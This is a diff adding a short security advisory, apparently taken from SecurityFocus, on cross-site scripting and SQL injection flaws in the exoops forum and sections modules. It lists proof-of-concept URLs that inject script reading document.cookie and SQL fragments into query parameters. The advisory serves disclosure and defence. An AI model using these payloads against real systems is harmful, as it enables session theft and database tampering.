@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/12915/info
+
+Multiple input validation vulnerabilities reportedly affect exoops. These issues are due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical actions.
+
+An attacker may leverage these issues to carry out cross-site scripting and SQL injection attacks against the affected application. This may result in the theft of authentication credentials, destruction or disclosure of sensitive data, and potentially other attacks. 
+
+http://www.example.com/modules/newbb/viewforum.php?sortname=p.post_time&sortorder=ASC&sortdays=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&forum=25&refresh=Vai
+Pops cookie
+http://www.example.com/modules/newbb/index.php?viewcat=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3EPops cookie
+http://www.example.com/modules/newbb/index.php?viewcat='SQL_INJECTION
+http://www.example.com/modules/sections/index.php?op=viewarticle&artid=9%2c+9%2c+9 
